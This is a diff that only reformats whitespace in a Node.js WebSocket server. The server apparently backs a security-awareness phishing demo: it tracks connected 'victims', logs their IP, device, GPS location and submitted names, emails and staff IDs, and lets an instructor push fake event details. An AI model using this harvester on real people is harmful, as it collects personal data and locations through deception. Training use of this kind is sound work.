@@ -35,14 +35,14 @@
 'use strict';
 
 const { WebSocketServer } = require('ws');
-const fs      = require('fs');
-const path    = require('path');
-const http    = require('http');
+const fs = require('fs');
+const path = require('path');
+const http = require('http');
 const Database = require('better-sqlite3');
 
 // ── CONFIG ────────────────────────────────────────────────────────────
-const WS_PORT   = process.env.WS_PORT   ? parseInt(process.env.WS_PORT)   : 8765;
-const API_PORT  = process.env.API_PORT  ? parseInt(process.env.API_PORT)  : 8766;
+const WS_PORT = process.env.WS_PORT ? parseInt(process.env.WS_PORT) : 8765;
+const API_PORT = process.env.API_PORT ? parseInt(process.env.API_PORT) : 8766;
 const TRUST_PROXY = process.env.TRUST_PROXY !== 'false'; // default true
 
 // Session label for this run — override with SESSION_ID env var.
@@ -54,8 +54,8 @@ const DEFAULT_SESSION = process.env.SESSION_ID
 // Add as many pairs as you need.  Change these before sharing the repo.
 const INSTRUCTOR_TOKENS = {
   'CSA-DEMO-2026': 'default',          // ← original single token kept as "default"
-  'CSA-AM-2026':   'session_AM',       // morning cohort
-  'CSA-PM-2026':   'session_PM',       // afternoon cohort
+  'CSA-AM-2026': 'session_AM',       // morning cohort
+  'CSA-PM-2026': 'session_PM',       // afternoon cohort
 };
 
 // SQLite database file (excluded from git via .gitignore)
@@ -129,28 +129,28 @@ function log(line) {
 
 // ── DEVICE PARSING ────────────────────────────────────────────────────
 function parseUA(ua = '') {
-  const isTablet   = /iPad|Tablet|PlayBook/i.test(ua) && !/Mobile/i.test(ua);
-  const isMobile   = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+  const isTablet = /iPad|Tablet|PlayBook/i.test(ua) && !/Mobile/i.test(ua);
+  const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
   const deviceType = isTablet ? 'Tablet' : isMobile ? 'Mobile' : 'Desktop';
 
   let os = 'Unknown OS';
-  if      (/Windows NT 10/i.test(ua))       os = 'Windows 10/11';
-  else if (/Windows NT 6\.3/i.test(ua))     os = 'Windows 8.1';
-  else if (/Windows NT 6\.1/i.test(ua))     os = 'Windows 7';
-  else if (/Windows/i.test(ua))             os = 'Windows';
-  else if (/Android ([\d.]+)/i.test(ua))    os = `Android ${ua.match(/Android ([\d.]+)/i)[1]}`;
-  else if (/iPhone OS ([\d_]+)/i.test(ua))  os = `iOS ${ua.match(/iPhone OS ([\d_]+)/i)[1].replace(/_/g,'.')}`;
-  else if (/iPad.*OS ([\d_]+)/i.test(ua))   os = `iPadOS ${ua.match(/iPad.*OS ([\d_]+)/i)[1].replace(/_/g,'.')}`;
-  else if (/Mac OS X ([\d_.]+)/i.test(ua))  os = `macOS ${ua.match(/Mac OS X ([\d_.]+)/i)[1].replace(/_/g,'.')}`;
-  else if (/Linux/i.test(ua))               os = 'Linux';
+  if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
+  else if (/Windows NT 6\.3/i.test(ua)) os = 'Windows 8.1';
+  else if (/Windows NT 6\.1/i.test(ua)) os = 'Windows 7';
+  else if (/Windows/i.test(ua)) os = 'Windows';
+  else if (/Android ([\d.]+)/i.test(ua)) os = `Android ${ua.match(/Android ([\d.]+)/i)[1]}`;
+  else if (/iPhone OS ([\d_]+)/i.test(ua)) os = `iOS ${ua.match(/iPhone OS ([\d_]+)/i)[1].replace(/_/g, '.')}`;
+  else if (/iPad.*OS ([\d_]+)/i.test(ua)) os = `iPadOS ${ua.match(/iPad.*OS ([\d_]+)/i)[1].replace(/_/g, '.')}`;
+  else if (/Mac OS X ([\d_.]+)/i.test(ua)) os = `macOS ${ua.match(/Mac OS X ([\d_.]+)/i)[1].replace(/_/g, '.')}`;
+  else if (/Linux/i.test(ua)) os = 'Linux';
 
   let browser = 'Unknown Browser';
-  if      (/Edg\/([\d.]+)/i.test(ua))       browser = `Edge ${ua.match(/Edg\/([\d.]+)/i)[1]}`;
-  else if (/OPR\/([\d.]+)/i.test(ua))       browser = `Opera ${ua.match(/OPR\/([\d.]+)/i)[1]}`;
-  else if (/Chrome\/([\d.]+)/i.test(ua))    browser = `Chrome ${ua.match(/Chrome\/([\d.]+)/i)[1]}`;
-  else if (/Firefox\/([\d.]+)/i.test(ua))   browser = `Firefox ${ua.match(/Firefox\/([\d.]+)/i)[1]}`;
+  if (/Edg\/([\d.]+)/i.test(ua)) browser = `Edge ${ua.match(/Edg\/([\d.]+)/i)[1]}`;
+  else if (/OPR\/([\d.]+)/i.test(ua)) browser = `Opera ${ua.match(/OPR\/([\d.]+)/i)[1]}`;
+  else if (/Chrome\/([\d.]+)/i.test(ua)) browser = `Chrome ${ua.match(/Chrome\/([\d.]+)/i)[1]}`;
+  else if (/Firefox\/([\d.]+)/i.test(ua)) browser = `Firefox ${ua.match(/Firefox\/([\d.]+)/i)[1]}`;
   else if (/Version\/([\d.]+).*Safari/i.test(ua)) browser = `Safari ${ua.match(/Version\/([\d.]+)/i)[1]}`;
-  else if (/Chromium\/([\d.]+)/i.test(ua))  browser = `Chromium ${ua.match(/Chromium\/([\d.]+)/i)[1]}`;
+  else if (/Chromium\/([\d.]+)/i.test(ua)) browser = `Chromium ${ua.match(/Chromium\/([\d.]+)/i)[1]}`;
 
   return { deviceType, os, browser };
 }
@@ -159,10 +159,10 @@ function parseUA(ua = '') {
 // ── IP RESOLUTION ─────────────────────────────────────────────────────
 function resolveIP(req) {
   if (TRUST_PROXY) {
-    const fwd  = req.headers['x-forwarded-for'];
-    if (fwd)   return fwd.split(',')[0].trim();
+    const fwd = req.headers['x-forwarded-for'];
+    if (fwd) return fwd.split(',')[0].trim();
     const real = req.headers['x-real-ip'];
-    if (real)  return real.trim();
+    if (real) return real.trim();
   }
   return (req.socket.remoteAddress || 'unknown').replace(/^::ffff:/, '');
 }
@@ -228,18 +228,18 @@ log(`Instructor tokens configured: ${Object.keys(INSTRUCTOR_TOKENS).length}`);
 log('──────────────────────────────────\n');
 
 wss.on('connection', (ws, req) => {
-  const ip       = resolveIP(req);
+  const ip = resolveIP(req);
   const clientId = `client_${Date.now()}_${++clientCounter}`;
-  let   role     = 'victim';
-  let   room     = null;   // set on instructor registration
+  let role = 'victim';
+  let room = null;   // set on instructor registration
 
   // Track this socket as a victim (will be removed if they register as instructor)
   victimSockets.add(ws);
 
   // Record victim in DB immediately
   stmtUpsertVictim.run({
-    client_id:    clientId,
-    session_id:   DEFAULT_SESSION,
+    client_id: clientId,
+    session_id: DEFAULT_SESSION,
     ip,
     connected_at: ts(),
   });
@@ -265,7 +265,7 @@ wss.on('connection', (ws, req) => {
       addInstructor(ws, room);
       log(`[*] INSTRUCTOR  registered from ${ip}  token="${token}"  room="${room}"  (total in room: ${instructorRooms.get(room).size})`);
       ws.send(JSON.stringify({
-        type:       'auth_ok',
+        type: 'auth_ok',
         session_id: DEFAULT_SESSION,
         room,
       }));
@@ -277,13 +277,13 @@ wss.on('connection', (ws, req) => {
       const parsed = parseUA(msg.userAgent);
       const enriched = { ...msg, ...parsed, serverIP: ip };
       stmtUpdateDevice.run({
-        client_id:   clientId,
+        client_id: clientId,
         device_json: JSON.stringify(enriched),
       });
       log(`[i] DEVICE      ${clientId}  type=${parsed.deviceType}  os=${parsed.os}  browser=${parsed.browser}  ip=${ip}`);
       broadcastAll({
         ...enriched,
-        type:       'device_info',
+        type: 'device_info',
         clientId,
         session_id: DEFAULT_SESSION,
       });
@@ -293,7 +293,7 @@ wss.on('connection', (ws, req) => {
     // ── LOCATION ─────────────────────────────────────────────────
     if (msg.type === 'location') {
       stmtUpdateLocation.run({
-        client_id:     clientId,
+        client_id: clientId,
         location_json: JSON.stringify(msg),
       });
       const src = msg.source === 'GPS'
@@ -324,8 +324,8 @@ wss.on('connection', (ws, req) => {
         client_id: clientId,
         form_json: JSON.stringify({
           fullName: msg.fullName,
-          email:    msg.email,
-          staffId:  msg.staffId,
+          email: msg.email,
+          staffId: msg.staffId,
         }),
       });
       log(`[!] FORM        ${clientId}  ip=${ip}  name="${msg.fullName}"  email="${msg.email}"  staffId="${msg.staffId}"`);
@@ -337,9 +337,9 @@ wss.on('connection', (ws, req) => {
     if (msg.type === 'config_update' && role === 'instructor') {
       log(`[*] CONFIG      instructor updated event config: date="${msg.eventDate}" time="${msg.eventTime}" venue="${msg.eventVenue}"`);
       broadcastToVictims({
-        type:       'config_update',
-        eventDate:  msg.eventDate,
-        eventTime:  msg.eventTime,
+        type: 'config_update',
+        eventDate: msg.eventDate,
+        eventTime: msg.eventTime,
         eventVenue: msg.eventVenue,
       });
       return;
@@ -378,13 +378,13 @@ const apiServer = http.createServer((req, res) => {
   if (req.method === 'GET' && match) {
     const sessionId = decodeURIComponent(match[1]);
     const rows = stmtGetSession.all(sessionId).map(r => ({
-      clientId:    r.client_id,
-      session_id:  r.session_id,
-      ip:          r.ip,
+      clientId: r.client_id,
+      session_id: r.session_id,
+      ip: r.ip,
       connectedAt: r.connected_at,
-      device:      r.device_json   ? JSON.parse(r.device_json)   : null,
-      location:    r.location_json ? JSON.parse(r.location_json) : null,
-      form:        r.form_json     ? JSON.parse(r.form_json)     : null,
+      device: r.device_json ? JSON.parse(r.device_json) : null,
+      location: r.location_json ? JSON.parse(r.location_json) : null,
+      form: r.form_json ? JSON.parse(r.form_json) : null,
       lastFrameAt: r.last_frame_at,
     }));
     res.end(JSON.stringify({ session_id: sessionId, victims: rows }));
@@ -394,12 +394,12 @@ const apiServer = http.createServer((req, res) => {
   // GET /api/current  — quick shortcut: victims in this run's session
   if (req.method === 'GET' && url === '/api/current') {
     const rows = stmtGetSession.all(DEFAULT_SESSION).map(r => ({
-      clientId:    r.client_id,
-      ip:          r.ip,
+      clientId: r.client_id,
+      ip: r.ip,
       connectedAt: r.connected_at,
-      device:      r.device_json   ? JSON.parse(r.device_json)   : null,
-      location:    r.location_json ? JSON.parse(r.location_json) : null,
-      form:        r.form_json     ? JSON.parse(r.form_json)     : null,
+      device: r.device_json ? JSON.parse(r.device_json) : null,
+      location: r.location_json ? JSON.parse(r.location_json) : null,
+      form: r.form_json ? JSON.parse(r.form_json) : null,
       lastFrameAt: r.last_frame_at,
     }));
     res.end(JSON.stringify({ session_id: DEFAULT_SESSION, victims: rows }));
